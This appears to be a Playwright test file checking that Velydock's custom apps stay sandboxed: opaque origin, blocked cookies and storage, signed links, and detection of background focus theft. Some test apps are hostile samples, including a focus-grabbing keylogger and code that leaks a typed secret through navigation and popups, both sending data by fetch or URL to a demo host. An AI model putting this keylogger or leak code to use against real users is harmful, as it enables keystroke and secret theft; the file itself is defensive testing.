import { expect, test, type FrameLocator, type Page } from '@playwright/test';
import { DEMO_URL, DOCK_URL, SANDBOX_URL } from '../support/stack';
import { appFrame } from '../support/ui';
import { apiAs, contextAs, unique, world } from '../support/world';

type Probe = Record<string, string>;

/**
 * The document of a custom app that is open in the workspace. An app without network access is
 * not loaded into the frame directly: the frame holds a script-less wrapper, and the app sits one
 * frame deeper (the wrapper decides where that inner frame may navigate - nowhere else).
 */
async function customApp(page: Page, appId: string): Promise<FrameLocator> {
  const outer = appFrame(page, appId).contentFrame();
  await expect(outer.locator('body > *').first()).toBeAttached({ timeout: 20_000 });
  return (await outer.locator('body > iframe').count()) > 0 ? outer.frameLocator('body > iframe') : outer;
}

/** Open a custom app and read what its own JavaScript found out about its surroundings. */
async function runProbe(page: Page, appId: string): Promise<Probe> {
  await page.goto(`/app/${appId}`);
  const frame = await customApp(page, appId);
  await expect(frame.locator('#probe[data-done="true"]')).toBeVisible({ timeout: 20_000 });
  return JSON.parse((await frame.locator('#probe').textContent())!) as Probe;
}

test.describe('Eigene Apps sind vom Rest isoliert', () => {
  test('der Frame ist eine Sandbox ohne eigenen Origin und kommt vom Sandbox-Host', async ({ browser }) => {
    const { apps } = world();
    const context = await contextAs(browser, 'mia');
    const page = await context.newPage();
    await page.goto(`/app/${apps.notes}`);
    const frame = appFrame(page, apps.notes);
    await expect(frame).toHaveAttribute('data-app-type', 'custom');
    await expect(frame).toHaveAttribute('src', new RegExp(`^${SANDBOX_URL}/c/`));

    const sandbox = ((await frame.getAttribute('sandbox')) ?? '').split(/\s+/).filter(Boolean);
    expect(sandbox).toContain('allow-scripts');
    expect(sandbox).not.toContain('allow-same-origin');
    expect(sandbox.filter((flag) => flag.startsWith('allow-top-navigation'))).toEqual([]);
    expect(await frame.getAttribute('allow')).toBeNull();
    await context.close();
  });

  test('eigener Code läuft, erreicht aber weder Cookies noch Speicher noch die Velydock-Seite', async ({ browser }) => {
    const { apps } = world();
    const context = await contextAs(browser, 'mia');
    const page = await context.newPage();
    const probe = await runProbe(page, apps.notes);

    expect(probe.origin).toBe('null'); // an opaque origin: not the sandbox host, not Velydock
    for (const capability of ['cookie', 'localStorage', 'sessionStorage', 'parentDocument', 'parentLocation', 'topNavigation']) {
      expect(probe[capability], capability).toMatch(/^BLOCKED:/);
    }
    // Without the network option the code cannot talk to anything, Velydock's API included.
    expect(probe.api).toMatch(/^BLOCKED:/);
    expect(probe.apiNoCors).toMatch(/^BLOCKED:/);

    // The page is still Velydock (the app could not navigate it away) and the session works.
    expect(page.url()).toBe(`${DOCK_URL}/app/${apps.notes}`);
    expect((await page.request.get('/api/v1/me')).status()).toBe(200);

    // And it is a working app: its script reacts to a click.
    const frame = await customApp(page, apps.notes);
    await frame.locator('#count').click();
    await expect(frame.locator('#count')).toHaveText('Geklickt: 1');
    // It received the user's theme.
    expect(['dark', 'light']).toContain(probe.theme);
    await context.close();
  });

  test('auch mit Netzwerkzugriff führt Velydock nichts im Namen des Benutzers aus', async ({ browser }) => {
    const { apps } = world();
    const context = await contextAs(browser, 'mia');
    const page = await context.newPage();
    const toVelydock: { url: string; method: string; status: number; cookie: boolean }[] = [];
    page.on('response', async (response) => {
      const request = response.request();
      if (request.frame() !== page.mainFrame() && request.url().startsWith(`${DOCK_URL}/api/`)) {
        const cookie = ((await request.allHeaders()).cookie ?? '').includes('velydock_session');
        toVelydock.push({ url: request.url(), method: request.method(), status: response.status(), cookie });
      }
    });
    const probe = await runProbe(page, apps.netNotes);

    expect(probe.origin).toBe('null');
    // Reading the API fails (no CORS permission) …
    expect(probe.api).toMatch(/^BLOCKED:/);
    // … and none of the requests that did leave the frame was carried out as the user. Chromium
    // and Firefox do not attach the session cookie to requests of a sandboxed frame. WebKit
    // does - there it is the server that refuses, because the request comes from another origin.
    expect(toVelydock.length).toBeGreaterThan(0);
    for (const request of toVelydock) {
      expect([401, 403], `${request.method} ${request.url} (cookie ${request.cookie ? 'sent' : 'not sent'})`).toContain(request.status);
    }
    // The blind POST to the logout endpoint changed nothing: the user is still signed in.
    expect((await page.request.get('/api/v1/me')).status()).toBe(200);
    for (const capability of ['cookie', 'localStorage', 'parentDocument', 'topNavigation']) {
      expect(probe[capability], capability).toMatch(/^BLOCKED:/);
    }
    await context.close();
  });

  test('auch direkt im Browser geöffnet bleibt die App in der Sandbox', async ({ browser }) => {
    // A dedicated app: opened as a page of its own, a document may of course navigate itself,
    // so this one only reports what it can reach.
    const anna = await apiAs('anna');
    const app = await (
      await anna.post('/api/v1/admin/apps', {
        data: {
          name: unique('Direkt'),
          type: 'custom',
          visible_to_all: true,
          custom_html: '<pre id="probe"></pre>',
          custom_js: `
            const result = { origin: self.origin };
            for (const [name, action] of [
              ['cookie', () => document.cookie],
              ['localStorage', () => (localStorage.setItem('probe', '1'), 'writable')],
            ]) {
              try { result[name] = String(action()); } catch (error) { result[name] = 'BLOCKED:' + error.name; }
            }
            document.getElementById('probe').textContent = JSON.stringify(result);
            document.getElementById('probe').dataset.done = 'true';`,
        },
      })
    ).json();
    const mia = await apiAs('mia');
    const launched = await (await mia.post(`/api/v1/workspace/apps/${app.id}/launch`, { data: { theme: 'dark', language: 'de' } })).json();
    await mia.dispose();
    expect(launched.url.startsWith(`${SANDBOX_URL}/c/`)).toBe(true);

    const context = await contextAs(browser, 'mia');
    const page = await context.newPage();
    const response = await page.goto(launched.url);
    const csp = response!.headers()['content-security-policy']!;
    expect(csp).toMatch(/^sandbox /);
    expect(csp).not.toContain('allow-same-origin');
    expect(response!.headers()['set-cookie']).toBeUndefined();
    // What the address serves is the wrapper; the app runs in the frame inside it.
    expect(csp).toContain(`frame-src ${SANDBOX_URL}`);
    expect(await page.locator('script').count()).toBe(0);
    const inner = page.frameLocator('body > iframe');
    await expect(inner.locator('#probe[data-done="true"]')).toBeVisible();
    const probe = JSON.parse((await inner.locator('#probe').textContent())!) as Probe;
    expect(probe.origin).toBe('null');
    expect(probe.cookie).toMatch(/^BLOCKED:/);
    expect(probe.localStorage).toMatch(/^BLOCKED:/);
    await context.close();
    await anna.delete(`/api/v1/admin/apps/${app.id}`);
    await anna.dispose();
  });

  test('ohne Netzwerkzugriff führt kein Weg hinaus – keine Umleitung, kein Fenster, kein Link', async ({ browser }) => {
    // An app that tries every way of carrying data to another address that needs no "network":
    // navigating itself, opening a window, and a link in a new tab.
    const html = `
      <button id="nav">umleiten</button>
      <button id="popup">Fenster</button>
      <a id="link" href="${DEMO_URL}/?leak=link" target="_blank">Link</a>
      <p id="state">bereit</p>`;
    const js = `
      const secret = 'eingetipptes-geheimnis';
      document.getElementById('nav').onclick = () => { location.href = '${DEMO_URL}/?leak=nav-' + secret; };
      document.getElementById('popup').onclick = () => {
        // Refused differently by the engines: Chromium and WebKit return null, Firefox throws.
        let opened = null;
        try { opened = window.open('${DEMO_URL}/?leak=popup-' + secret); } catch { opened = null; }
        document.getElementById('state').textContent = opened ? 'geöffnet' : 'kein Fenster';
      };`;
    const anna = await apiAs('anna');
    const create = async (allowNetwork: boolean) =>
      (
        await (
          await anna.post('/api/v1/admin/apps', {
            data: {
              name: unique(allowNetwork ? 'Offen' : 'Dicht'),
              type: 'custom',
              visible_to_all: true,
              custom_html: html,
              custom_js: js,
              custom_allow_network: allowNetwork,
            },
          })
        ).json()
      ).id as string;
    const sealed = await create(false);
    const open = await create(true);

    const context = await contextAs(browser, 'mia');
    const leaked: string[] = [];
    context.on('request', (request) => {
      if (request.url().startsWith(DEMO_URL) && request.url().includes('leak=')) leaked.push(request.url());
    });
    const page = await context.newPage();
    try {
      await page.goto(`/app/${sealed}`);
      const app = await customApp(page, sealed);
      await app.locator('#popup').click();
      await expect(app.locator('#state')).toHaveText('kein Fenster');
      await app.locator('#link').click();
      await page.waitForTimeout(500);
      expect(context.pages().length, 'no window or tab was opened').toBe(1);
      await app.locator('#nav').click();
      await page.waitForTimeout(1000);
      expect(leaked, 'nothing reached the other address').toEqual([]);
      // Velydock itself is untouched.
      expect(page.url()).toBe(`${DOCK_URL}/app/${sealed}`);

      // The same app with "Netzwerkzugriff erlauben": the window opens. The option is what decides.
      await page.goto(`/app/${open}`);
      const second = await customApp(page, open);
      const opened = context.waitForEvent('page');
      await second.locator('#popup').click();
      await (await opened).close();
      expect(leaked.some((url) => url.includes('leak=popup-'))).toBe(true);
    } finally {
      await context.close();
      for (const id of [sealed, open]) await anna.delete(`/api/v1/admin/apps/${id}`);
      await anna.dispose();
    }
  });

  test('eine App im Hintergrund liest nicht mit, was auf einer Velydock-Seite getippt wird', async ({ browser, browserName }) => {
    // Opened apps stay loaded while another page is shown. This one lies low for a few seconds,
    // then pulls the keyboard focus to itself several times a second and reports every key it
    // sees, and every time it got the focus. It has network access, so that it could tell the
    // world - the test listens for that.
    const anna = await apiAs('anna');
    const name = unique('Lauscher');
    const thief = (
      await (
        await anna.post('/api/v1/admin/apps', {
          data: {
            name,
            type: 'custom',
            visible_to_all: true,
            custom_allow_network: true,
            custom_html: '<h1>Wichtige Links</h1><input id="f" style="opacity:0;position:absolute">',
            custom_js: `
              const keys = [];
              let timer;
              addEventListener('keydown', (event) => {
                keys.push(event.key);
                clearTimeout(timer);
                timer = setTimeout(() => fetch('${DEMO_URL}/?keys=' + encodeURIComponent(keys.join('')), { mode: 'no-cors' }), 200);
              }, true);
              addEventListener('focus', () => fetch('${DEMO_URL}/?grab=' + Date.now(), { mode: 'no-cors', keepalive: true }));
              setTimeout(() => setInterval(() => {
                if (!document.hasFocus()) { window.focus(); document.getElementById('f').focus(); }
              }, 150), 3000);`,
          },
        })
      ).json()
    ).id as string;

    const context = await contextAs(browser, 'mia');
    const overheard: string[] = [];
    const grabs: string[] = [];
    context.on('request', (request) => {
      if (!request.url().startsWith(DEMO_URL)) return;
      const url = new URL(request.url());
      if (url.searchParams.has('keys')) overheard.push(url.searchParams.get('keys')!);
      if (url.searchParams.has('grab')) grabs.push(url.searchParams.get('grab')!);
    });
    const page = await context.newPage();
    try {
      await page.goto(`/app/${thief}`);
      await expect(appFrame(page, thief).contentFrame().locator('#f')).toBeAttached({ timeout: 20_000 });

      // On to the profile, inside the application: the app stays loaded, now out of sight.
      await page.getByRole('link', { name: 'Startseite' }).click();
      await page.getByTestId('user-menu').click();
      await page.getByRole('menuitem', { name: 'Profil' }).click();
      const field = page.getByLabel('Nachname', { exact: true });
      await expect(field).toBeVisible();
      await field.fill('');
      await field.click();
      // Slow enough that the app starts grabbing the keyboard in the middle of it.
      const typed = 'Ein Geheimnis das nur hierhin gehoert 1234567890';
      await page.keyboard.type(typed, { delay: 120 });

      await page.waitForTimeout(600);
      const value = await field.inputValue();
      const heard = overheard.join('');
      if (browserName === 'firefox') {
        // Firefox does not let a frame that is not rendered take the focus in the first place:
        // there was nothing to take back, and the app is still loaded.
        expect(value).toBe(typed);
        expect(heard, 'keys that reached the app in the background').toBe('');
        await expect(appFrame(page, thief)).toHaveCount(1);
      } else {
        // Chromium and WebKit do. Velydock notices right after, takes the focus back and closes
        // the app at this first grab - there is no second one - and says so.
        await expect(appFrame(page, thief)).toHaveCount(0);
        await expect(page.getByTestId('toast').filter({ hasText: name })).toContainText('Tastatureingabe');
        expect(grabs.length, 'times the app got the focus').toBeLessThanOrEqual(1);
        // Noticing comes after the fact: a key pressed in the instant between the grab and the
        // next thing the page gets to do can be gone or arrive in the app. Normally there is
        // none (the measurements are in docs/tests.md); never more than that one.
        expect(heard.length, `keys that reached the app in the background: "${heard}"`).toBeLessThanOrEqual(1);
        expect(typed.length - value.length, `keys missing in the field: "${value}"`).toBeLessThanOrEqual(1);
        if (value.length === typed.length) expect(value).toBe(typed);
      }
    } finally {
      await context.close();
      await anna.delete(`/api/v1/admin/apps/${thief}`);
      await anna.dispose();
    }
  });

  test('Links sind kurzlebig signiert; gefälschte werden abgewiesen', async ({ browser }) => {
    const { apps } = world();
    const mia = await apiAs('mia');
    const { url, expires_in } = await (await mia.post(`/api/v1/workspace/apps/${apps.notes}/launch`, { data: {} })).json();
    expect(expires_in).toBeLessThanOrEqual(600);
    const context = await browser.newContext();
    const [payload, signature] = url.split('/c/')[1].split('.');
    for (const forged of [`${payload}.${signature.split('').reverse().join('')}`, `${payload}A.${signature}`, 'abc.def', 'x']) {
      const response = await context.request.get(`${SANDBOX_URL}/c/${forged}`);
      expect(response.status(), forged).toBe(403);
      expect(await response.text()).not.toContain('Notizen');
    }
    // A valid link needs no session – and grants nothing beyond this one document.
    expect((await context.request.get(url)).status()).toBe(200);
    await context.close();
    await mia.dispose();
  });

  test('der Sandbox-Host hat keine API und keine Oberfläche, auch nicht mit Session-Cookie', async () => {
    const mia = await apiAs('mia');
    for (const path of ['/api/v1/me', '/api/v1/workspace/apps', '/api/health', '/', '/admin/users', '/login']) {
      const response = await mia.get(`${SANDBOX_URL}${path}`);
      expect(response.status(), path).toBe(404);
      expect(await response.text(), path).toBe('');
    }
    await mia.dispose();
  });

  test('wer eine eigene App nicht sehen darf, bekommt keinen Link dafür', async () => {
    const { apps } = world();
    const gero = await apiAs('gero'); // member of another organization
    expect((await gero.post(`/api/v1/workspace/apps/${apps.notes}/launch`, { data: {} })).status()).toBe(404);
    await gero.dispose();
  });
});
